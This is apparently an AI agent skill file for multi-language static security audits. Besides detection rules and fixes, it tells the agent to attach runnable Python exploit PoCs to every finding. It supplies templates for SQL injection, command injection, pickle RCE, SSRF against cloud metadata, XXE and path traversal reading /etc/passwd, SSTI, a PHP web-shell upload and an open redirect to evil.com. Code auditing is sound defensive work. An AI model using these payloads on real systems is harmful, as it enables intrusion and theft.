---
name: WebSecurityAuditSkillSkill
description: 集成60+正则表达式检测规则，支持PHP、Java、Python、Go等语言的代码安全审计
---

# Web Security Audit Skill

Multi-language static code security audit for web applications.
Covers **PHP**, **Java**, **Python**, and **Go**.

## Trigger

Use this skill when the user asks to:

- "审计代码安全" / "audit my code" / "scan for vulnerabilities"
- "检查漏洞" / "find security issues"
- "代码安全审查" / "code security review"
- "生成 Security.md"
- Mentions any of: SQL injection, XSS, RCE, SSRF, XXE, deserialization,
  path traversal, SSTI, file upload, open redirect, hardcoded secrets

## Workflow

### Step 1: Determine scope

Ask the user for the target directory. If not provided, infer from context
(current workspace, recently mentioned project).

### Step 2: Run the audit engine

Execute the bundled Python audit engine:

```bash
python3 scripts/main.py <target_directory> [--lang php|java|python|go]
```

The engine will:
1. Recursively collect source files (excluding `node_modules`, `vendor`,
   `.git`, `__pycache__`, etc.)
2. Auto-detect language per file by extension
3. Apply 60+ regex-based detection rules
4. Output structured findings (JSON)

Supported file extensions per language:

| Language | Extensions |
|----------|-----------|
| PHP | `.php` `.phtml` `.php3` `.php4` `.php5` `.inc` |
| Java | `.java` `.jsp` `.jspx` |
| Python | `.py` `.pyw` `.html` `.jinja2` `.j2` |
| Go | `.go` |

### Step 3: Generate Security.md

Based on audit results, generate a **Security.md** report using the template
structure defined below. Each finding must include:

1. **Vulnerable Location** — file path + line number + code snippet
2. **Root Cause** — why the code is vulnerable (CWE reference)
3. **Code Analysis** — explanation of the vulnerable pattern
4. **Remediation** — concrete fix steps with code examples
5. **Exploit (PoC)** — runnable Python exploit script

### Step 4: Present results

Show a summary table first, then the full Security.md content or file path.

---

## Vulnerability Coverage (12 categories)

| # | Category | CWE | Severity | Detection Pattern |
|---|----------|-----|----------|-------------------|
| 1 | SQL Injection | CWE-89 | Critical | String concatenation in SQL queries, no parameterized queries |
| 2 | Command Injection / RCE | CWE-78 | Critical | User input passed to `system()`, `exec()`, `Runtime.exec()`, `subprocess` |
| 3 | Cross-Site Scripting (XSS) | CWE-79 | High | Raw user input echoed to HTML without encoding |
| 4 | Insecure Deserialization | CWE-502 | Critical | `unserialize()`, `pickle.loads()`, `ObjectInputStream.readObject()` on user input |
| 5 | Server-Side Request Forgery | CWE-918 | High | User-controlled URL in `curl_exec`, `requests.get`, `http.Get` |
| 6 | XML External Entity (XXE) | CWE-611 | High | XML parsing without disabling external entities |
| 7 | Path Traversal | CWE-22 | High | User input in `fopen`, `open()`, `os.Open`, `File()` |
| 8 | Server-Side Template Injection | CWE-1336 | Critical | User input to `render_template_string`, `template.Parse` |
| 9 | Insecure File Upload | CWE-434 | High | `move_uploaded_file` without MIME/content validation |
| 10 | Open Redirect | CWE-601 | Medium | User-controlled `Location` header |
| 11 | Hardcoded Credentials | CWE-798 | High | API keys, tokens, passwords in source code |
| 12 | Sensitive Endpoint Exposure | CWE-200 | Medium | Spring Actuator, Django debug, debug endpoints |

---

## Security.md Template

For each finding, use this exact structure:

```markdown
##### [N] RULE-ID — filename.ext

- **Rule ID:** `LANG-CAT-001`
- **CWE:** [CWE-XXX](https://cwe.mitre.org/data/definitions/XXX.html)
- **Category:** Category Name
- **Severity:** Critical / High / Medium / Low

**Vulnerable Location:**
`File : /absolute/path/to/file.ext`
`Line : N`
`Code : the actual vulnerable line`

**Root Cause:**
Concise explanation of the vulnerability mechanism.

**Code Analysis:**
How user input flows to the sink, why sanitization is missing.

**Remediation:**
1. Specific fix step 1
2. Specific fix step 2

**Exploit (PoC):**
`python
#!/usr/bin/env python3
"""PoC for CATEGORY"""
import requests
TARGET = "http://target.example.com/vuln-endpoint"
# ... actual exploit code ...
`
```

---

## Exploit Templates

For each vulnerability category, generate a **runnable Python 3 PoC script**
using the `requests` library. Templates below.

### SQL Injection PoC

```python
#!/usr/bin/env python3
"""SQL Injection PoC"""
import requests

TARGET = "http://target.example.com/vuln.php?id=1"

def exploit():
    # Error-based detection
    payloads = ["'", '"', "' OR '1'='1", "' OR 1=1--", "1' AND 1=2--"]
    for p in payloads:
        r = requests.get(TARGET + p, timeout=10)
        if any(kw in r.text.lower() for kw in
               ["sql", "mysql", "syntax", "unclosed", "odbc"]):
            print(f"[+] Error-based SQLi: {p}")

    # UNION column count probe
    for i in range(1, 21):
        p = f"' UNION SELECT {','.join(['NULL']*i)}-- "
        r = requests.get(TARGET + p, timeout=10)
        if "NULL" not in r.text and len(r.text) > 0:
            print(f"[+] Column count: {i}")
            break

    # DB info extraction
    p = "' UNION SELECT NULL,@@version,database(),user(),NULL-- "
    r = requests.get(TARGET + p, timeout=10)
    print(f"[+] DB info: {r.text[:500]}")

if __name__ == "__main__":
    exploit()
```

### Command Injection / RCE PoC

```python
#!/usr/bin/env python3
"""Command Injection / RCE PoC"""
import requests

TARGET = "http://target.example.com/ping?host="
PARAM = "cmd"

def exploit():
    payloads = [
        ("; id", "uid="),
        ("| id", "uid="),
        ("&& whoami", ""),
        ("\nwhoami", ""),
        ("$(id)", "uid="),
        ("`id`", "uid="),
        ("& whoami &", ""),
    ]
    for cmd, expected in payloads:
        r = requests.get(TARGET + cmd, params={PARAM: cmd}, timeout=10)
        if expected in r.text:
            print(f"[+] RCE confirmed: {cmd}")
            print(f"    Response: {r.text[:300]}")
            return

if __name__ == "__main__":
    exploit()
```

### XSS PoC

```python
#!/usr/bin/env python3
"""XSS PoC"""
import requests

TARGET = "http://target.example.com/search"
PARAM = "q"

def exploit():
    payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(document.domain)</script>',
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ]
    for p in payloads:
        r = requests.get(TARGET, params={PARAM: p}, timeout=10)
        if p in r.text:
            print(f"[+] Reflected XSS: {p}")
            return
    print("[-] No reflected XSS detected (CSP may block)")

if __name__ == "__main__":
    exploit()
```

### Insecure Deserialization PoC

```python
#!/usr/bin/env python3
"""Insecure Deserialization PoC"""
import requests
import pickle
import base64
import subprocess

TARGET = "http://target.example.com/api/load"

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

def exploit():
    # Python pickle RCE
    pickle_payload = base64.b64encode(pickle.dumps(RCE())).decode()

    # PHP deserialization probe
    php_payload = 'O:8:"stdClass":1:{s:4:"test";s:10:"php_uname()";}'

    for name, payload in [("PHP", php_payload), ("Pickle", pickle_payload)]:
        r = requests.post(TARGET, data=payload, timeout=10)
        if "uid=" in r.text or "root" in r.text:
            print(f"[+] {name} deserialization RCE confirmed!")
            return
    print("[*] Use OOB callback for confirmation")

if __name__ == "__main__":
    exploit()
```

### SSRF PoC

```python
#!/usr/bin/env python3
"""SSRF PoC"""
import requests

TARGET = "http://target.example.com/fetch"
PARAM = "url"

def exploit():
    internal = [
        "http://127.0.0.1:22",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
    ]
    for url in internal:
        try:
            r = requests.get(TARGET, params={PARAM: url}, timeout=5)
            if r.status_code == 200 and len(r.text) > 10:
                print(f"[+] SSRF confirmed: {url}")
                print(f"    Response: {r.text[:300]}")
                return
        except requests.Timeout:
            print(f"[*] Timeout on {url} — may be filtered")
        except Exception:
            continue

if __name__ == "__main__":
    exploit()
```

### XXE PoC

```python
#!/usr/bin/env python3
"""XXE PoC"""
import requests

TARGET = "http://target.example.com/api/xml"

def exploit():
    payloads = [
        ('<?xml version="1.0"?>\n'
         '<!DOCTYPE foo [\n'
         '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
         ']>\n'
         '<root>&xxe;</root>', "/etc/passwd"),
        ('<?xml version="1.0"?>\n'
         '<!DOCTYPE foo [\n'
         '  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n'
         ']>\n'
         '<root>&xxe;</root>', "win.ini"),
    ]
    headers = {"Content-Type": "application/xml"}
    for payload, name in payloads:
        r = requests.post(TARGET, data=payload, headers=headers, timeout=10)
        if "root:" in r.text or "nobody:" in r.text:
            print(f"[+] XXE confirmed — {name} leaked!")
            print(f"    {r.text[:500]}")
            return

if __name__ == "__main__":
    exploit()
```

### Path Traversal PoC

```python
#!/usr/bin/env python3
"""Path Traversal / LFI PoC"""
import requests

TARGET = "http://target.example.com/view"
PARAM = "file"

def exploit():
    paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ]
    for path in paths:
        r = requests.get(TARGET, params={PARAM: path}, timeout=10)
        if "root:" in r.text:
            print(f"[+] Path Traversal: {path}")
            print(f"    {r.text[:500]}")
            return

if __name__ == "__main__":
    exploit()
```

### SSTI PoC

```python
#!/usr/bin/env python3
"""Server-Side Template Injection PoC"""
import requests

TARGET = "http://target.example.com/greet"
PARAM = "name"

def exploit():
    probes = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${{7*7}}", "49", "Jinja2"),
        ("#{7*7}", "49", "Pug/Jade"),
    ]
    for payload, expected, engine in probes:
        r = requests.get(TARGET, params={PARAM: payload}, timeout=10)
        if expected in r.text:
            print(f"[+] SSTI confirmed — Engine: {engine}")
            print(f"    Payload: {payload}")
            return
    print("[-] No known SSTI pattern detected")

if __name__ == "__main__":
    exploit()
```

### File Upload PoC

```python
#!/usr/bin/env python3
"""File Upload PoC"""
import requests
import os
import tempfile

TARGET = "http://target.example.com/upload"

def exploit():
    shell = ('<?php\n'
             'if(isset($_GET[\'cmd\'])){\n'
             '    echo "<pre>";\n'
             '    system($_GET[\'cmd\']);\n'
             '    echo "</pre>";\n'
             '}\n'
             '?>\n')
    with tempfile.NamedTemporaryFile(suffix=".php", delete=False, mode="w") as f:
        f.write(shell)
        tmpfile = f.name
    filenames = [
        ("shell.php", "application/x-php"),
        ("shell.php.jpg", "image/jpeg"),
        ("shell.php%00.jpg", "image/jpeg"),
        ("shell.pHp", "application/x-php"),
    ]
    for fname, mime in filenames:
        with open(tmpfile, "rb") as f:
            r = requests.post(TARGET, files={"file": (fname, f, mime)}, timeout=10)
            print(f"[*] {fname}: status={r.status_code}, response={r.text[:200]}")
    os.unlink(tmpfile)

if __name__ == "__main__":
    exploit()
```

### Open Redirect PoC

```python
#!/usr/bin/env python3
"""Open Redirect PoC"""
import requests

TARGET = "http://target.example.com/redirect"
PARAM = "url"
EVIL = "https://evil.com/phishing"

def exploit():
    payloads = [EVIL, "//evil.com", "https:evil.com"]
    for p in payloads:
        r = requests.get(TARGET, params={PARAM: p},
                         allow_redirects=False, timeout=10)
        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if "evil.com" in loc:
                print(f"[+] Open Redirect: {loc}")
                return

if __name__ == "__main__":
    exploit()
```

---

## Detection Rules Reference

### PHP Detection Patterns

| Rule ID | Category | Pattern |
|---------|----------|---------|
| PHP-SQLI-001 | SQL Injection | `mysql_query(` / `->query(` with `$` variable in query string |
| PHP-XSS-001 | XSS | `echo $_GET` / `print $_POST` / `<?=$_REQUEST` |
| PHP-RCE-001 | RCE | `system($` / `exec($` / `shell_exec($` / `eval($` / `` ` `$ `` |
| PHP-LFI-001 | File Inclusion | `include($_GET` / `require($_POST` |
| PHP-DESER-001 | Deserialization | `unserialize($_GET` |
| PHP-SSRF-001 | SSRF | `file_get_contents($_GET` / `curl_exec(` with user URL |
| PHP-UPLOAD-001 | File Upload | `move_uploaded_file($_FILES` |
| PHP-XXE-001 | XXE | `simplexml_load_string($` / `DOMDocument->loadXML($` |
| PHP-REDIR-001 | Open Redirect | `header("Location: ".$_GET` |

### Java Detection Patterns

| Rule ID | Category | Pattern |
|---------|----------|---------|
| JAVA-SQLI-001 | SQL Injection | `createStatement()` / `executeQuery("SELECT...+"` |
| JAVA-XSS-001 | XSS | `response.getWriter().print(request.get` |
| JAVA-RCE-001 | RCE | `Runtime.getRuntime().exec(request.get` |
| JAVA-DESER-001 | Deserialization | `ObjectInputStream(request` / `readObject()` |
| JAVA-SSRF-001 | SSRF | `HttpURLConnection` / `RestTemplate` with user URL |
| JAVA-XXE-001 | XXE | `DocumentBuilderFactory.newInstance()` |
| JAVA-PATH-001 | Path Traversal | `new File(request.get` / `Paths.get(request.get` |
| JAVA-ACT-001 | Actuator | `endpoints.web.exposure.include=*` |

### Python Detection Patterns

| Rule ID | Category | Pattern |
|---------|----------|---------|
| PY-SQLI-001 | SQL Injection | `.execute(f"...request"` / `.execute("...%s" % request` |
| PY-XSS-001 | XSS | `|safe` / `mark_safe(request` / `render_template_string(request` |
| PY-RCE-001 | RCE | `os.system(request` / `subprocess.run(request` / `eval(request` |
| PY-SSTI-001 | SSTI | `render_template_string(request` / `Template(request` |
| PY-DESER-001 | Deserialization | `pickle.loads(request` / `yaml.load(request` |
| PY-SSRF-001 | SSRF | `requests.get(request` / `urlopen(request` |
| PY-PATH-001 | Path Traversal | `open(request` / `send_file(request` |
| PY-SECRET-001 | Django Secret | `SECRET_KEY = '...'` hardcoded |

### Go Detection Patterns

| Rule ID | Category | Pattern |
|---------|----------|---------|
| GO-SQLI-001 | SQL Injection | `fmt.Sprintf("SELECT...%s"` / `db.Query("SELECT..."+` |
| GO-XSS-001 | XSS | `w.Write([]byte(r.` / `fmt.Fprintf(w, r.` |
| GO-RCE-001 | RCE | `exec.Command(r.` / `exec.CommandContext(ctx, r.` |
| GO-SSTI-001 | SSTI | `template.New(r.` / `.Execute(w, r.` |
| GO-SSRF-001 | SSRF | `http.Get(r.` / `http.NewRequest(r.` |
| GO-PATH-001 | Path Traversal | `os.Open(r.` / `ioutil.ReadFile(r.` |

---

## Remediation Quick Reference

| Category | Primary Fix |
|----------|------------|
| SQL Injection | Use parameterized queries / prepared statements / ORM |
| Command Injection | Use language-native APIs; never shell out with user input |
| XSS | Context-aware output encoding; CSP headers |
| Deserialization | Use JSON; HMAC-sign serialized data; type allowlists |
| SSRF | URL allowlists; block internal IPs; disable unsafe schemes |
| XXE | Disable external entity processing; migrate to JSON |
| Path Traversal | Canonicalize paths; verify within sandbox directory |
| SSTI | Never pass user input to template engines directly |
| File Upload | Validate MIME magic bytes; store outside web root |
| Open Redirect | Redirect allowlists; indirect references |
| Hardcoded Secrets | Environment variables; secrets manager (Vault/AWS) |

---

## Output Requirements

After completing the audit, you MUST:

1. **Save Security.md** to the target directory or a user-specified path
2. **Present a summary table** with file counts, finding counts by severity
3. **List the output file path** as the final deliverable
